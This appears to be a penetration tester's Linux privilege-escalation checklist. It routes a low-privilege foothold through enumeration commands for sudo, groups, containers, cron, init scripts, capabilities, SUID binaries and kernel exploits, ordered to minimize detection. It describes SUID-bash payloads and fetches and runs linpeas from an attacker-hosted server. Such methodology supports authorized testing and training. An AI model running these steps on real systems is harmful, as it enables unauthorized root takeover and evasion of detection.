
Routes user-level Linux foothold to PrivEsc walkthroughs. Pure router — exploitation content lives in `Linux PrivEsc Walkthroughs/`. Post-root activities (credential extraction, persistence, lateral movement) out of scope.

Ordering: stealth-then-yield, with crash-risk vectors deferred. Zero-IOC checks first; filesystem scans late; kernel exploits second-to-last (crash risk); linpeas last (max IOC). Operator may deviate in lab/CTF context.

---

## Step 0 — Trivial root attempt

`su -`

When prompted for password, hit Enter (blank).

- Prompt returns `#` → root achieved. Done.
- "Authentication failure" → proceed.

---

## Step 1 — Sudo and group privileges

### Sudo:

`sudo -l`

- sudo -l lists a binary for which a GTFOBins entry exists with a `Shell` function AND the Shell function has a populated `Sudo` tab → [[Sudo Shell Escape]]
- `env_keep` includes `LD_PRELOAD` OR `LD_LIBRARY_PATH` → [[Sudo Environment Variables]]
- Nothing usable → proceed

### Groups:

`id`

- `docker` in groups → [[Docker Socket Abuse]]
- `lxd` or `lxc` in groups → [[LXD Socket Abuse]]
- `disk` in groups → [[Disk Group Escape]]
- None → proceed

---

## Step 2 — Container attack surface

### In-container detection:

`cat /proc/1/cgroup 2>/dev/null | grep -E 'docker|lxc|kubepods' && echo "IN_CONTAINER" || (test -f /.dockerenv && echo "IN_CONTAINER" || echo "NOT_IN_CONTAINER")`

- `IN_CONTAINER` → [[Container Escape to Host Root]]
- `NOT_IN_CONTAINER` → proceed

### Docker socket:

`test -w /var/run/docker.sock && echo "DOCKER_SOCK_WRITABLE"`

- `DOCKER_SOCK_WRITABLE` → [[Docker Socket Abuse]]
- No output → proceed

### LXD socket:

`for s in /var/lib/lxd/unix.socket /var/snap/lxd/common/lxd/unix.socket; do test -w "$s" && echo "LXD_SOCK_WRITABLE: $s"; done`

- `LXD_SOCK_WRITABLE: <path>` → [[LXD Socket Abuse]]
- No output → proceed to Step 3

---

## Step 3 — Sensitive file permissions

### /etc/shadow & /etc/passwd:

`test -r /etc/shadow && echo "SHADOW READABLE" || echo "SHADOW NOT READABLE"`
`test -w /etc/passwd && echo "PASSWD WRITABLE" || echo "PASSWD NOT WRITABLE"`
`test -w /etc/shadow && echo "SHADOW WRITABLE" || echo "SHADOW NOT WRITABLE"` 

- `SHADOW READABLE` → [[Linux PrivEsc Walkthroughs/Readable Shadow|Readable /etc/shadow]]
- `PASSWD WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Passwd|Writable /etc/passwd]]
- `SHADOW WRITABLE` → [[Linux PrivEsc Walkthroughs/Writable Shadow|Writable /etc/shadow]]
- All three `NOT` → proceed

---

## Step 4 — Credential Harvesting

Read-only filesystem enum for credential-bearing artefacts. Stealth-positive — bash history of read commands is the only IOC.

1. [[History Files]]
2. [[Config Files]]
3. [[SSH Keys]]
4. [[Process cmdline & environ]] — *stub; skip. Build canonically when first encountered in the wild — walkthrough + `~/scripts/proc_enum.sh` covering `/proc/*/cmdline` and `/proc/*/environ`, parallel to History Files / Config Files / SSH Keys.*

All four exhausted with no elevation → proceed to Step 5.

---

## Step 5 — Scheduled execution

### Cron / anacron / at substrate:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/sched_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_SCRIPT[root,cron]: <path>` → [[Cron File Permissions]], use `<path>` as `<script>`
- `WRITABLE_SCRIPT[root,anacron]: <path>` → [[Anacron File Permissions]]
- `WRITABLE_SCRIPT[root,at]: <path>` → [[At-job File Permissions]]
- `RELATIVE_CMD[root,cron]: <cmd>` AND `WRITABLE_PATH_DIR[cron]: <dir>` both present → [[Cron PATH]]
- `RELATIVE_CMD[root,anacron]: <cmd>` AND `WRITABLE_PATH_DIR[anacron]: <dir>` both present → [[Anacron PATH]]
- `RELATIVE_CMD[root,at]: <cmd>` AND `WRITABLE_PATH_DIR[at]: <dir>` both present → [[At-job PATH]]
- `WILDCARD[root,cron]: <dir>:<file>:<line>:<body>` → [[Cron Wildcards]]
- `WILDCARD[root,anacron]: <dir>:<file>:<line>:<body>` → [[Anacron Wildcards]]
- `WILDCARD[root,at]: <dir>:<file>:<line>:<body>` → [[At-job Wildcards]]

### Logrotate config permissions:

Trigger-agnostic — logrotate runs via cron and/or systemd timer; the exploit fires on rotation regardless of which. Paste into target shell:

On **target:**

`test -w /etc/logrotate.conf 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: /etc/logrotate.conf"; test -w /etc/logrotate.d 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: /etc/logrotate.d"; for f in /etc/logrotate.d/*; do [ -f "$f" ] || continue; test -w "$f" 2>/dev/null && echo "WRITABLE_LOGROTATE_CONFIG: $f"; done`

Route on output markers:

- `WRITABLE_LOGROTATE_CONFIG: <path>` → [[Logrotate Config Permissions]], use `<path>` as `<config>`

### No route:

No markers from either block → no scheduled-execution PrivEsc route, proceed to Step 6

---

## Step 6 — Init system hijacking 

### Systemd unit files:

⚠️ **Build-when-encountered.** `~/scripts/systemd_enum.sh` is deferred — no script body exists yet. On first real-box encounter of this step: build the script from first principles against the live target (which is the canonical validation context), conforming to the marker contract below. The marker contract is the locked architectural shape only — specific marker names and field structure are likely to refine when the script is built against real systemd output. 

Once `~/scripts/systemd_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**: 

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/systemd_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.) 

Paste into target shell. 

Route on output markers: 
- `WRITABLE_TIMER[root]: <path>` → [[Systemd Timer File Permissions]] 
- `WRITABLE_SERVICE[root]: <path>` → [[Systemd Service File Permissions]] 
- `WRITABLE_SOCKET[root]: <path>` → [[Systemd Socket File Permissions]] 
- `WRITABLE_DROPIN[root]: <path>` → [[Systemd Drop-in File Permissions]] 
- `WRITABLE_EXECSTART[root]: <path>` → [[Systemd ExecStart Hijack]] 
- `WRITABLE_SYSTEMD_PATH_DIR[root]: <dir>` → [[Systemd PATH]] 
- No output → continue to next sub-block.
### Init.d scripts:

⚠️ `[[Init.d Script Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot (rcS.d/rc*.d) + runlevel transitions (`init <N>`) + **admin** invocations (`service <name> {start|restart|stop}`), not reboot-only; (2) payload = SUID bash (`chmod 4755`), not `chmod +x`; (3) artefact naming + drop-dir per `[[Stealth Drop Dir Probe]]`; (4) writable-but-non-executable exploitable only if foothold user can `chmod +x` (owns file) — walkthrough discriminates; (5) manual invocation from foothold shell only inherits foothold uid.

On **target:**

`for f in /etc/init.d/*; do [ -f "$f" ] && test -w "$f" && echo "WRITABLE_INITD: $f"; done; echo "INITD_SCANNED: /etc/init.d/"`

Route on output markers:

- `WRITABLE_INITD: <path>` → [[Init.d Script Permissions]], use `<path>` as `<script>`
- `INITD_SCANNED: /etc/init.d/` with no preceding `WRITABLE_INITD` → check completed cleanly, no writable init.d scripts. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### rc.local:

⚠️ `[[rc.local Permissions]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot-only (wired via S99rc.local at end of runlevel); (2) modern systemd distros ship `rc-local.service` with `ConditionFileIsExecutable=/etc/rc.local` — file needs execute bit for systemd to fire it; (3) payload = SUID bash (`chmod 4755`); (4) manual invocation from foothold shell inherits foothold uid — MUST wait for boot.

On **target:**

`[ -f /etc/rc.local ] && test -w /etc/rc.local && echo "WRITABLE_RC_LOCAL: /etc/rc.local"; echo "RC_LOCAL_SCANNED: /etc/rc.local"`

Route on output markers:

- `WRITABLE_RC_LOCAL: /etc/rc.local` → [[rc.local Permissions]]
- `RC_LOCAL_SCANNED: /etc/rc.local` with no preceding `WRITABLE_RC_LOCAL` → check completed cleanly, rc.local not writable or absent. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### Runlevel symlink directories:

⚠️ `[[Runlevel Directory Symlink Drop]]` walkthrough body — build-when-encountered. Points to include: (1) trigger family is boot + runlevel transitions (`init <N>`); (2) exploit shape = drop new symlink `S99<name>` in writable rc*.d/ dir pointing to attacker-owned executable script (needs execute bit) — NOT edit existing file; (3) payload = SUID bash in symlink target; (4) artefact naming per `[[Stealth Drop Dir Probe]]`.

On **target:**

`for d in /etc/rc0.d /etc/rc1.d /etc/rc2.d /etc/rc3.d /etc/rc4.d /etc/rc5.d /etc/rc6.d /etc/rcS.d; do [ -d "$d" ] && test -w "$d" && echo "WRITABLE_RC_D_DIR: $d"; done; echo "RC_D_SCANNED"`

Route on output markers:

- `WRITABLE_RC_D_DIR: <dir>` → [[Runlevel Directory Symlink Drop]], use `<dir>` as `<rc_dir>`
- `RC_D_SCANNED` with no preceding `WRITABLE_RC_D_DIR` → check completed cleanly, no writable runlevel dirs. Continue to next sub-block.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

### No route:

No markers from any sub-block → no init-system-hijacking PrivEsc route, proceed to Step 7 
 
---

## Step 7 — Shell startup hijacking

⚠️ `[[Shell Startup File Permissions]]` walkthrough body — build-when-encountered. Include yield caveat: OSCP+/lab/CTF yield high (admin simulation triggers regularly on target boxes); real-engagement yield time-variable (production servers may go weeks between root interactive logins). Not a descope reason — vector is valid, timing is context-dependent.

On **target:**

`clear; r=$(getent passwd root 2>/dev/null | cut -d: -f7); [ -z "$r" ] && r=$(awk -F: '$1=="root"{print $7}' /etc/passwd 2>/dev/null); case "$r" in /sbin/nologin|/usr/sbin/nologin|/bin/false|/usr/bin/false) echo "SHELL_INIT_INAPPLICABLE: $r" ;; /bin/bash|/usr/bin/bash|/bin/rbash) for f in /etc/profile /etc/profile.d/*.sh /etc/bash.bashrc /etc/bashrc; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/sh|/bin/dash) for f in /etc/profile /etc/profile.d/*.sh; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/zsh|/usr/bin/zsh) for f in /etc/zsh/zshenv /etc/zsh/zprofile /etc/zsh/zshrc /etc/zsh/zlogin; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; /bin/csh|/bin/tcsh) for f in /etc/csh.cshrc /etc/csh.login; do [ -e "$f" ] && test -w "$f" && echo "WRITABLE_SHELL_INIT: $f"; done; echo "SHELL_INIT_SCANNED: $r" ;; *) echo "SHELL_INIT_UNKNOWN_SHELL: $r" ;; esac`

Route on output markers:

- `WRITABLE_SHELL_INIT: <path>` → [[Shell Startup File Permissions]], use `<path>` as `<init_file>`
- `SHELL_INIT_INAPPLICABLE: <shell>` → interactive root login blocked. No shell-startup route. Proceed to Step 8.
- `SHELL_INIT_UNKNOWN_SHELL: <shell>` → root's shell not recognized. Log for manual investigation, proceed to Step 8.
- `SHELL_INIT_SCANNED: <shell>` **with no preceding `WRITABLE_SHELL_INIT`** → check completed cleanly, no writable init files for root's shell. Proceed to Step 8.
- No output at all → paste did not execute (terminal issue, syntax mangling, or connection drop). Retry.

---

## Step 8 — Root-owned services

`ps -ef | awk '$1=="root" && $8 !~ /^\[/'`

- `mysqld` running as root → [[MySQL UDF]]
- `postgres` running as root → [[Postgres UDF]]
- `redis-server` running as root → [[Redis Configuration File Write]]
- `org.apache.catalina.startup.Bootstrap` in cmdline args, running as root → [[Tomcat Manager WAR Deploy]]
- Any other root-owned service → [[Service Known Exploits]]
- Nothing → proceed

> **Architectural note.** Enumeration filters to UID=root by design. The rare case of a non-root daemon with a CVE that directly grants root is excluded by this filter. If that case is ever encountered, the response is pre-decided: drop the awk root filter, rename the step, update inline bullets with explicit "running as root" qualifiers, broaden Service Known Exploits to UID-agnostic. **No re-deliberation.** Full reasoning in Vault_Strategy.md `Decisions held` — search "service known exploits root-gating decision".

---

## Step 9 — NFS exports

`cat /etc/exports 2>/dev/null`

- Shows an export with `no_root_squash` → [[NFS no_root_squash]]
- Empty / no `no_root_squash` line → move on to the next step.

---

## Step 10 — PATH abuse

`echo $PATH; for d in $(echo $PATH | tr ':' ' '); do test -w "$d" && echo "WRITABLE: $d"; done`

- Any directory in `$PATH` writable by current user → [[PATH Hijack]]
- None writable → proceed

---

## Step 11 — Library abuse

⚠️ **Build-when-encountered.** `~/scripts/lib_enum.sh` is deferred — no script body exists yet. On first real-box encounter of this step: build the script from first principles against the live target (which is the canonical validation context), conforming to the marker contract below. The marker contract is the locked architectural shape only — specific marker names and field structure are likely to refine when the script is actually written against real linker-search output.

Once `~/scripts/lib_enum.sh` exists, invoke per the `Scheduled execution` pattern:

On **attacker**:

`(echo "bash <<'EOF'"; sed -e '/^[[:space:]]*#/d' -e '/^[[:space:]]*$/d' ~/scripts/lib_enum.sh; echo "EOF") | xclip -selection clipboard`

(Wayland: substitute `wl-copy` for `xclip -selection clipboard`.)

Paste into target shell.

Route on output markers:

- `WRITABLE_LIB_DIR: <dir>` → [[Library Hijack]]
- `WRITABLE_LIB_FILE: <path>` → [[Library Hijack]]
- No markers → no library-abuse PrivEsc route, proceed to Step 12

---

## Step 12 — Capabilities

`getcap -r / 2>/dev/null`

(**Is there a coverage gap with this step, I think probably yes. This step enumerates FILE caps (`getcap -r /`), but does not enumerate RUNNING PROCESS caps (`getpcaps <pid>`)**). 

- `cap_setuid+ep` on standard binary (e.g. `/usr/bin/python3`, `/usr/bin/perl`) → [[Capability Abuse]]
- `cap_dac_read_search+ep` on accessible binary → [[Capability Abuse]]
- `cap_sys_admin+ep` on accessible binary → [[Capability Abuse]]
- Nothing → proceed

---

## Step 13 — SUID / SGID binaries

⚠️ High IOC. Full filesystem traversal — run once; the technique walkthroughs reuse this output, they do not re-run the `find`.

`find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null`

(No output → proceed to Step 14)

Try the below technique walkthroughs in stealth-first order. Each receives this list (the output from the above command), self-selects the binaries it applies to, loops them, and returns here on exhaustion to try the next:

1. [[SUID Known Exploits]]
2. [[SUID Shared Object Injection]]
3. [[SUID Environment Variables]]
4. [[SUID Function Export Hijack]]
5. [[SUID PS4 Debug Trace]]

All five exhausted with no elevation → proceed to Step 14.

---

## Step 14 — Kernel exploits

⚠️ Kernel exploits risk kernel panics — box may need reset. Run only after Steps 0–13 fall through.

`uname -r`

Record as `<kernel_version>` (e.g. `2.6.32-5-amd64`).

`for f in /etc/os-release /etc/debian_version /etc/redhat-release /etc/lsb-release /etc/issue; do echo "--- $f ---"; cat "$f" 2>/dev/null || echo "(absent)"; done`

From the populated files, identify and record `<distro>` (e.g. Debian, Ubuntu, RHEL, CentOS) and `<major_version>` (e.g. 6, 16, 7).

- Check in vault for `OS Exploit Index/Linux/<Distro> <Major version>.md`. If matching file, does the file's Applicable exploits table have a row matching `<kernel_version>` in the `Build` column AND `PrivEsc` in the `Stage` column → if yes, run that row's Walkthrough
- Otherwise → proceed

---

## Step 15 — Automated enumeration (linpeas)

⚠️ Maximum IOC. Comprehensive backstop.

### Transfer:

On **attacker** (in the linpeas directory):

`python3 -m http.server 8000`

On target:

`wget http://<lhost>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`

### Run:

`/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out`

### Triage:

Focus on red+yellow flagged findings. Route each finding back to the appropriate step above (sudo / SUID / cron / etc.) for exploitation.

### Cleanup:

`rm /tmp/linpeas.sh /tmp/linpeas.out`

---

## Exhaustion

All sixteen steps fall through:

1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
3. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
